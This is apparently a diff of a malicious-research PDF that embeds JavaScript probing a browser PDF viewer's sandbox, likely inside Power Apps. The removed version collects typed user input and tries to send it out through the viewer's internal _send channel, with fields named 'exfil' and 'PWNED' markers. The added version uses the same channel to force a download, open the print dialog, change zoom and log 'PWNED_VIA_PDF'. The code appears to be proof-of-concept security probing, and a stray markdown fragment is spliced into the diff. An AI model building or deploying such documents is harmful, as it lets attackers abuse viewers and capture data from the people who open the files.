@@ -1,5 +1,24 @@
+// These commands work via this._send({command: "x"})
+"clear"           → console.clear()
+"error"           → console.error(value)
+"layout"          → change page spread mode
+"page-num"        → navigate to page number
+"print"           → trigger print dialog
+"println"         → console.log(value)
+"zoom"            → set zoom level
+"SaveAs"          → trigger download
+"FirstPage"       → go to first page
+"LastPage"        → go to last page
+"NextPage"        → next page
+"PrevPage"        → previous page
+"ZoomViewIn"      → increase zoom
+"ZoomViewOut"     → decrease zoom
+```
+
+**What this means for your PDF:**
+```
 %PDF-1.7
-% Direct send() Exfil Probe - March 2026
+% Viewer Command Probe - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -21,71 +40,44 @@ endobj
       try {
         var results = [];
 
-        // Capture test data first
-        var captured = app.response("Enter test value:", "Power Apps");
-        results.push("captured: [" + captured + "]");
+        // === NAVIGATION COMMANDS ===
+        results.push("=== NAVIGATION ===");
 
-        if (captured !== null) {
+        try {
+          this._send({ command: "LastPage" });
+          results.push("LastPage: sent");
+        } catch(e) { results.push("LastPage: " + e); }
 
-          // The _send() function in the sandbox calls:
-          // externals["send"](data) -> window.dispatchEvent(CustomEvent("updatefromsandbox"))
-          // The updateFromSandbox handler in viewer.js reads:
-          // { id, siblings, command, value }
-          // If id is present it routes to annotationStorage.setValue(id, detail)
-          // If no id it handles commands: clear/error/layout/page-num/print/zoom/SaveAs etc.
+        try {
+          this._send({ command: "page-num", value: 0 });
+          results.push("page-num: sent");
+        } catch(e) { results.push("page-num: " + e); }
 
-          // === TEST 1: Command without ID - trigger viewer commands ===
-          results.push("=== COMMANDS ===");
+        try {
+          this._send({ command: "zoom", value: 5 });
+          results.push("zoom 500%: sent");
+        } catch(e) { results.push("zoom: " + e); }
 
-          // Try SaveAs command - triggers download
-          try {
-            this._send({ command: "SaveAs" });
-            results.push("SaveAs: sent");
-          } catch(e) { results.push("SaveAs: " + e); }
+        // === HIGH VALUE - TRIGGER DOWNLOAD ===
+        results.push("=== DOWNLOAD ===");
+        try {
+          this._send({ command: "SaveAs" });
+          results.push("SaveAs: sent");
+        } catch(e) { results.push("SaveAs: " + e); }
 
-          // Try println - outputs to console (visible in devtools)
-          try {
-            this._send({ command: "println", value: "PWNED:" + captured });
-            results.push("println: sent");
-          } catch(e) { results.push("println: " + e); }
+        // === TRIGGER PRINT DIALOG ===
+        results.push("=== PRINT ===");
+        try {
+          this._send({ command: "print" });
+          results.push("print: sent");
+        } catch(e) { results.push("print: " + e); }
 
-          // Try zoom command
-          try {
-            this._send({ command: "zoom", value: 2 });
-            results.push("zoom: sent");
-          } catch(e) { results.push("zoom: " + e); }
-
-          // === TEST 2: With ID - routes to annotationStorage ===
-          results.push("=== ANNOTATION STORAGE ===");
-
-          // annotationStorage.setValue(id, detail) - sets PDF form field values
-          // If PowerApps reads annotationStorage, this is our bridge
-          try {
-            this._send({ id: "captured_data", value: captured });
-            results.push("annotationStorage id: sent");
-          } catch(e) { results.push("annotationStorage: " + e); }
-
-          // Try with siblings
-          try {
-            this._send({ id: "exfil", siblings: ["exfil2"], value: captured });
-            results.push("with siblings: sent");
-          } catch(e) { results.push("siblings: " + e); }
-
-          // === TEST 3: Try doc._send directly ===
-          results.push("=== DOC SEND ===");
-          try {
-            doc._send({ command: "println", value: "doc._send:" + captured });
-            results.push("doc._send: ok");
-          } catch(e) { results.push("doc._send: " + e); }
-
-          // === TEST 4: console.println ===
-          results.push("=== CONSOLE ===");
-          try {
-            console.println("PWNED_CONSOLE: " + captured);
-            results.push("console.println: sent");
-          } catch(e) { results.push("console.println: " + e); }
-
-        }
+        // === CONSOLE EXFIL ===
+        results.push("=== CONSOLE ===");
+        try {
+          this._send({ command: "println", value: "PWNED_VIA_PDF" });
+          results.push("println: sent");
+        } catch(e) { results.push("println: " + e); }
 
         app.alert(results.join("\\n"));
 
@@ -107,8 +99,8 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Direct Send Probe) Tj ET
-BT /F1 12 Tf 50 220 Td (Watch devtools console) Tj ET
+BT /F1 14 Tf 50 250 Td (Command Probe) Tj ET
+BT /F1 12 Tf 50 220 Td (Watch viewer) Tj ET
 endstream
 endobj
 
@@ -118,11 +110,11 @@ xref
 0000000015 00000 n 
 0000000075 00000 n 
 0000000135 00000 n 
-0000002400 00000 n 
-0000002560 00000 n 
+0000001800 00000 n 
+0000001960 00000 n 
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-2650
+2050
 %%EOF
